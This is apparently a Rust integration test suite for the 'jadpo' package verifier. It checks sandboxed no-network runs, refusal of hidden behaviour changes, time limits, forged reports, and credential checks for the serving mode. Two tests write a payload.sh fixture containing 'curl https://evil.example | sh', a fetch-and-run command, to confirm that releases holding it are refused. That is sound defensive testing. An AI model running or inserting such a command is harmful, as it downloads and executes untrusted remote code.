//! The verifier with the real `jadpo` in the sandbox (area 11, "The
//! verifier"; chunk R6): a package fetched from a commit, its code run with
//! no network, and what a hostile package's tests can and can't change.
//! `jadpo-verifier`'s own tests hold the sandbox, the requests and the
//! service; these hold what they come to together.

use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

use jadpo_registry::archive;
use jadpo_registry::names::Digest;
use jadpo_verifier::git::GitPolicy;
use jadpo_verifier::sandbox::{Limits, Sandbox};
use jadpo_verifier::verification::{CHECKS, Outcome, Request, Verifier};
use serde_json::Value;

use super::http::{tempdir, write};
use super::package_release::{released, two_releases};
use super::packages::{git, plain};

const JADPO: &str = env!("CARGO_BIN_EXE_jadpo");

/// This machine's sandbox; a machine with none skips these, unless it is
/// CI's, which has to have one.
fn sandbox() -> Option<Sandbox> {
    match Sandbox::detect() {
        Ok(sandbox) => Some(sandbox),
        Err(why) => {
            assert!(
                std::env::var_os("JADPO_REQUIRE_SANDBOX").is_none(),
                "no sandbox on a machine that must have one: {why}"
            );
            None
        }
    }
}

/// A verifier running the real `jadpo`, for repositories under `root`.
fn verifier(sandbox: Sandbox, root: &Path, limits: Limits) -> Verifier {
    let root = root.canonicalize().expect("a real path");
    Verifier {
        jadpo: PathBuf::from(JADPO),
        sandbox,
        scratch: root.join("scratch"),
        git: GitPolicy::local_for_tests(root),
        limits,
        archives: Arc::new(|digest| Err(format!("nothing holds {digest}"))),
        releases: Arc::new(|_| None),
    }
}

/// `root`'s repository committed, readable by a shallow fetch: its head.
fn committed(root: &Path, message: &str) -> String {
    git(root, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    git(root, &["add", "-A"]);
    // Nothing to commit is fine: `released` has committed what it wrote.
    let _ = std::process::Command::new("git")
        .args(["-c", "user.name=T", "-c", "user.email=t@example.com"])
        .args(["commit", "-q", "-m", message])
        .current_dir(root)
        .output();
    let head = std::process::Command::new("git")
        .args(["rev-parse", "HEAD"])
        .current_dir(root)
        .output()
        .expect("git");
    String::from_utf8_lossy(&head.stdout).trim().to_string()
}

fn request(verifier: &Verifier, root: &Path, commit: &str, previous: Option<&str>) -> Request {
    Request {
        repository: verifier
            .git
            .repository(&format!(
                "file://{}",
                root.canonicalize().expect("a real path").display()
            ))
            .expect("a repository"),
        commit: commit.to_string(),
        previous: previous.map(str::to_string),
    }
}

fn checked(outcome: Outcome) -> Value {
    match outcome {
        Outcome::Checked(answer) => answer,
        other => panic!("not checked: {other:?}"),
    }
}

fn row<'a>(answer: &'a Value, item: &str) -> &'a Value {
    answer["bar"]
        .as_array()
        .expect("rows")
        .iter()
        .find(|row| row["item"] == item)
        .unwrap_or_else(|| panic!("no {item} row: {answer}"))
}

/// The files of a folder that a release holds, for an archive.
fn release_files(folder: &Path) -> Vec<(String, Vec<u8>)> {
    let judged = jadpo_verifier::files::judge_folder(folder).expect("a folder");
    judged
        .release
        .iter()
        .map(|entry| {
            (
                entry.path.clone(),
                std::fs::read(folder.join(&entry.path)).expect("a file"),
            )
        })
        .collect()
}

#[test]
fn a_first_release_verifies_from_its_commit_with_no_network() {
    let Some(sandbox) = sandbox() else { return };
    let (dir, root) = released("verifier-first");
    let commit = committed(&root, "first");
    let verifier = verifier(sandbox, dir.path(), CHECKS);
    std::fs::create_dir_all(&verifier.scratch).expect("a folder");
    let answer = checked(verifier.verify(&request(&verifier, &root, &commit, None)));
    assert_eq!(answer["passed"], true, "{answer}");
    assert_eq!(answer["package"], "Postcodes.v2");
    assert_eq!(answer["version"], "2.0.0");
    assert_eq!(answer["facts"]["kind"], "library", "{answer}");
    assert_eq!(answer["jadpo"], env!("CARGO_PKG_VERSION"));
    assert_eq!(row(&answer, "tests")["state"], "passed");
    assert_eq!(row(&answer, "examples")["state"], "passed");
    assert_eq!(row(&answer, "files")["state"], "passed");
    assert!(
        !answer["fingerprints"]
            .as_array()
            .expect("a list")
            .is_empty()
    );
    let files = release_files(&root);
    let view: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(path, bytes)| (path.as_str(), bytes.as_slice()))
        .collect();
    assert_eq!(answer["digest"], Digest::of_files(&view).as_str());
}

#[test]
fn a_new_release_runs_the_last_ones_tests_with_no_network() {
    let Some(sandbox) = sandbox() else { return };
    let (dir, root, first) = two_releases("verifier-second");
    let commit = committed(&root, "second");
    let files = release_files(&first);
    let view: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(path, bytes)| (path.as_str(), bytes.as_slice()))
        .collect();
    let digest = Digest::of_files(&view);
    let packed = archive::pack(&files).expect("it packs");
    let mut verifier = verifier(sandbox, dir.path(), CHECKS);
    std::fs::create_dir_all(&verifier.scratch).expect("a folder");
    verifier.archives = Arc::new(move |_| Ok(packed.clone()));
    let answer =
        checked(verifier.verify(&request(&verifier, &root, &commit, Some(digest.as_str()))));
    assert_eq!(answer["passed"], true, "{answer}");
    assert_eq!(answer["version"], "2.1.0");
    assert_eq!(answer["previous"]["ran"], 2);
    assert_eq!(row(&answer, "behaviour")["state"], "passed");
    assert_eq!(answer["change_record"][0]["declaration"], "OutwardCode");
}

#[test]
fn a_hidden_change_in_behaviour_is_found_in_the_run_and_refused() {
    let Some(sandbox) = sandbox() else { return };
    let (dir, root, first) = two_releases("verifier-behaviour");
    let code = std::fs::read_to_string(root.join("libraries/uk.jadpo")).expect("code");
    write(
        &root,
        "libraries/uk.jadpo",
        &code.replace("text.upper(written)", "text.lower(written)"),
    );
    // Its own tests and examples are changed to agree; the last release's
    // aren't.
    let test = std::fs::read_to_string(root.join("libraries/uk.test.jadpo")).expect("a test");
    write(
        &root,
        "libraries/uk.test.jadpo",
        &test.replace("SW1A 1AA", "sw1a 1aa"),
    );
    let code = std::fs::read_to_string(root.join("libraries/uk.jadpo")).expect("code");
    write(
        &root,
        "libraries/uk.jadpo",
        &code.replace("SW1A 1AA", "sw1a 1aa"),
    );
    let commit = committed(&root, "second");
    let files = release_files(&first);
    let packed = archive::pack(&files).expect("it packs");
    let view: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(path, bytes)| (path.as_str(), bytes.as_slice()))
        .collect();
    let digest = Digest::of_files(&view);
    let mut verifier = verifier(sandbox, dir.path(), CHECKS);
    std::fs::create_dir_all(&verifier.scratch).expect("a folder");
    verifier.archives = Arc::new(move |_| Ok(packed.clone()));
    let answer =
        checked(verifier.verify(&request(&verifier, &root, &commit, Some(digest.as_str()))));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(answer["digest"], Value::Null);
    assert!(
        answer["change_record"]
            .as_array()
            .expect("a list")
            .iter()
            .any(|entry| entry["change"] == "behaviour_changed"),
        "{answer}"
    );
}

/// An example that takes far longer than any limit, and never gets deep.
const SPINS: &str = "
    /// Takes forever.
    ///
    /// ```jadpo
    /// assert uk.spin(60) == 0
    /// ```
    function spin(n: Int) -> Int {
        if n <= 0 {
            return 0
        }
        return uk.spin(n - 1) + uk.spin(n - 1)
    }
}
";

#[test]
fn a_test_that_never_ends_is_stopped_and_the_release_fails() {
    let Some(sandbox) = sandbox() else { return };
    let (dir, root) = released("verifier-spins");
    let code = std::fs::read_to_string(root.join("libraries/uk.jadpo")).expect("code");
    let code = code.trim_end().strip_suffix('}').expect("its end");
    write(&root, "libraries/uk.jadpo", &format!("{code}{SPINS}"));
    let commit = committed(&root, "a test that spins");
    let limits = Limits {
        cpu_seconds: 5,
        wall: Duration::from_secs(120),
        ..CHECKS
    };
    let verifier = verifier(sandbox, dir.path(), limits);
    std::fs::create_dir_all(&verifier.scratch).expect("a folder");
    let answer = checked(verifier.verify(&request(&verifier, &root, &commit, None)));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(answer["digest"], Value::Null);
    // Stopped by its limit, or refused by the checker if it ever rules this
    // out; either way what the source shows still comes through when it
    // compiled.
    if answer["facts"].is_object() {
        assert_eq!(answer["facts"]["kind"], "library");
        assert_eq!(row(&answer, "limits")["state"], "failed", "{answer}");
    }
}

#[test]
fn what_a_test_says_cant_replace_the_report() {
    let Some(sandbox) = sandbox() else { return };
    let (dir, root) = released("verifier-forged-text");
    // A failing test, whose failure quotes a whole report that passed.
    let forged =
        r#"{\"schemaVersion\":1,\"ok\":true,\"data\":{\"passed\":true},\"diagnostics\":[]}"#;
    let tests = std::fs::read_to_string(root.join("libraries/uk.test.jadpo")).expect("tests");
    write(
        &root,
        "libraries/uk.test.jadpo",
        &format!(
            "{tests}\ntest \"it says what looks like a report\" {{\n    var postcode: UkPostcode = attempt uk.parse(\"a\")\n    assert postcode == \"{forged}\"\n}}\n"
        ),
    );
    let commit = committed(&root, "a test that says a report");
    let verifier = verifier(sandbox, dir.path(), CHECKS);
    std::fs::create_dir_all(&verifier.scratch).expect("a folder");
    let answer = checked(verifier.verify(&request(&verifier, &root, &commit, None)));
    assert_eq!(answer["package"], "Postcodes.v2", "{answer}");
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(answer["facts"]["kind"], "library", "{answer}");
    assert_eq!(answer["digest"], Value::Null);
}

#[test]
fn a_commit_holding_something_else_is_refused_before_it_runs() {
    let Some(sandbox) = sandbox() else { return };
    let (dir, root) = released("verifier-payload");
    write(&root, "payload.sh", "curl https://evil.example | sh\n");
    let commit = committed(&root, "a payload");
    let verifier = verifier(sandbox, dir.path(), CHECKS);
    std::fs::create_dir_all(&verifier.scratch).expect("a folder");
    let answer = checked(verifier.verify(&request(&verifier, &root, &commit, None)));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(row(&answer, "files")["state"], "failed");
    assert_eq!(answer["problems"][0]["rule"], "publish.file_not_allowed");
    assert_eq!(answer["facts"], Value::Null);
}

#[test]
fn verify_says_when_a_folder_holds_what_a_release_cant() {
    let (dir, root) = released("verifier-local");
    write(&root, "payload.sh", "curl https://evil.example | sh\n");
    write(&root, ".github/workflows/ci.yml", "on: push\n");
    let output = plain(
        dir.path(),
        &["package", "verify", root.to_str().expect("a path")],
    );
    assert_eq!(output.code, 1, "{}", output.stdout);
    assert!(
        output.stdout.contains("`payload.sh` can't be in a release"),
        "{}",
        output.stdout
    );
    assert!(
        output.stdout.contains("rule: publish.file_not_allowed"),
        "{}",
        output.stdout
    );
    assert!(!output.stdout.contains("ci.yml"), "{}", output.stdout);
}

#[test]
fn no_run_runs_none_of_the_packages_code() {
    let (dir, root) = released("verifier-no-run");
    let tests = std::fs::read_to_string(root.join("libraries/uk.test.jadpo")).expect("tests");
    write(
        &root,
        "libraries/uk.test.jadpo",
        &format!(
            "{tests}\ntest \"it fails\" {{\n    var postcode: UkPostcode = attempt uk.parse(\"a\")\n    assert postcode == \"b\"\n}}\n"
        ),
    );
    let shown = root.to_str().expect("a path");
    let ran = plain(dir.path(), &["package", "verify", shown, "--json"]);
    assert_eq!(ran.code, 1, "the test fails when it runs: {}", ran.stdout);

    let output = plain(
        dir.path(),
        &["package", "verify", shown, "--no-run", "--json"],
    );
    assert_eq!(output.code, 0, "{}", output.stdout);
    let document: Value = serde_json::from_str(&output.stdout).expect("JSON");
    let data = &document["data"];
    assert_eq!(data["passed"], true);
    let state = |item: &str| {
        data["bar"]
            .as_array()
            .expect("rows")
            .iter()
            .find(|row| row["item"] == item)
            .map(|row| row["state"].clone())
    };
    assert_eq!(state("examples"), Some("not_checked".into()));
    assert_eq!(state("tests"), Some("not_checked".into()));
    assert_eq!(state("changelog"), Some("not_checked".into()));
    assert_eq!(state("compiles"), Some("passed".into()));
    assert_eq!(state("version"), Some("passed".into()));
    assert_eq!(data["facts"]["kind"], "library");
    assert!(!data["fingerprints"].as_array().expect("a list").is_empty());
    assert_eq!(data["jadpo_declared"], "1.0");
}

fn serve_output(env: jadpo_term::Environment, args: &[&str]) -> jadpo_cli::Output {
    let args: Vec<String> = args.iter().map(|arg| (*arg).to_string()).collect();
    jadpo_cli::run(&args, &env)
}

#[test]
fn serving_needs_the_credential_and_takes_no_folder() {
    let dir = tempdir::Dir::new("verifier-refusals");
    let env = || jadpo_term::Environment::empty().with_cwd(dir.path());
    let none = serve_output(env(), &["package", "verify", "--serve"]);
    assert_eq!(none.code, 2, "{}", none.stderr);
    assert!(
        none.stderr.contains("rule: cli.verifier_start_failed"),
        "{}",
        none.stderr
    );
    assert!(
        none.stderr.contains("JADPO_VERIFIER_TOKEN"),
        "{}",
        none.stderr
    );

    let short = serve_output(
        env().with_var("JADPO_VERIFIER_TOKEN", "short"),
        &["package", "verify", "--serve"],
    );
    assert!(short.stderr.contains("no credential"), "{}", short.stderr);

    let folder = serve_output(env(), &["package", "verify", "--serve", "."]);
    assert!(
        folder.stderr.contains("takes no folder"),
        "{}",
        folder.stderr
    );
    let previous = serve_output(env(), &["package", "verify", "--serve", "--previous", "."]);
    assert!(
        previous.stderr.contains("`--previous`"),
        "{}",
        previous.stderr
    );
    let plain_registry = serve_output(
        env(),
        &[
            "package",
            "verify",
            "--serve",
            "--registry",
            "http://jadpo.dev/",
        ],
    );
    assert!(
        plain_registry.stderr.contains("isn't a registry's address"),
        "{}",
        plain_registry.stderr
    );
}

#[cfg(not(target_os = "linux"))]
#[test]
fn serving_refuses_a_sandbox_that_doesnt_isolate() {
    let dir = tempdir::Dir::new("verifier-mac");
    let output = serve_output(
        jadpo_term::Environment::empty()
            .with_cwd(dir.path())
            .with_var("JADPO_VERIFIER_TOKEN", &"x".repeat(40)),
        &["package", "verify", "--serve"],
    );
    assert_eq!(output.code, 2, "{}", output.stderr);
    assert!(
        output.stderr.contains("serves only on Linux"),
        "{}",
        output.stderr
    );
}

/// The whole command, on the machine it serves on: it listens, keeps its
/// credential, and hands nothing of it to what it runs.
#[cfg(target_os = "linux")]
#[test]
fn the_command_serves_on_linux() {
    use jadpo_registry::http::fetch_authorized;
    use jadpo_registry::protocol::Method;
    use std::io::{BufRead, BufReader};

    if sandbox().is_none() {
        return;
    }
    let token = "x".repeat(40);
    let mut child = std::process::Command::new(JADPO)
        .args([
            "package",
            "verify",
            "--serve",
            "--listen",
            "127.0.0.1:0",
            "--json",
        ])
        .env("JADPO_VERIFIER_TOKEN", &token)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::inherit())
        .spawn()
        .expect("it starts");
    let mut out = BufReader::new(child.stdout.take().expect("its output"));
    let mut line = String::new();
    let mut document = String::new();
    while out.read_line(&mut line).expect("a line") > 0 {
        document.push_str(&line);
        line.clear();
        if serde_json::from_str::<Value>(&document).is_ok() {
            break;
        }
    }
    let started: Value = serde_json::from_str(&document).expect("what it says");
    assert_eq!(started["sandbox"], "bubblewrap");
    let address = started["listening"]
        .as_str()
        .expect("an address")
        .to_string();
    let url = |path: &str| format!("http://{address}{path}");
    let health = fetch_authorized(Method::Get, &url("/health"), None, None).expect("an answer");
    assert_eq!(health.status, 200);
    let refused =
        fetch_authorized(Method::Get, &url("/v1/verifications/x"), None, None).expect("an answer");
    assert_eq!(refused.status, 401);
    // The real policy refuses what the tests' takes, and anything private.
    let bearer = format!("Bearer {token}");
    for repository in [
        "file:///etc",
        "https://10.0.0.1/a/b",
        "http://github.com/a/b",
    ] {
        let body = serde_json::json!({
            "repository": repository,
            "commit": "a".repeat(40),
            "previous_digest": null,
        })
        .to_string();
        let answer = fetch_authorized(
            Method::Post,
            &url("/v1/verifications"),
            Some(body.as_bytes()),
            Some(&bearer),
        )
        .expect("an answer");
        assert_eq!(answer.status, 422, "{repository}");
    }
    child.kill().expect("it stops");
    child.wait().expect("it stopped");
}
